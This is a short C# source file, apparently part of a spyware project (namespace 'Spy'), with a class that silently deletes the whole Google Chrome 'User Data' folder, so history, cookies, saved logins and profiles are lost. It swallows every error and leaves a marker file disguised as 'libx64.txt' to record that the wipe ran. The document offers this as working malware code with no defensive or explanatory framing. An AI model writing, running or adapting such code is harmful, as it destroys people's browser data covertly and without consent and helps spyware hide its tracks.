using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Spy
{
    class HistoryDroper
    {
        const string ChromeDataPath = "Google\\Chrome\\User Data";

        static string AppDataLocalPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        static string MarkHistoryFilePath = Path.Combine(AppDataLocalPath, "libx64.txt");

        public static void DropChromeData()
        {
            try
            {
                var path = Path.Combine(AppDataLocalPath, ChromeDataPath);

                Directory.Delete(path, true);
            } catch { }
        }

        public static void MarkHistoryDropped()
        {
            File.Create(MarkHistoryFilePath);
        }

        public static bool IsHistoryDropped()
        {
            return File.Exists(MarkHistoryFilePath);
        }
    }
}
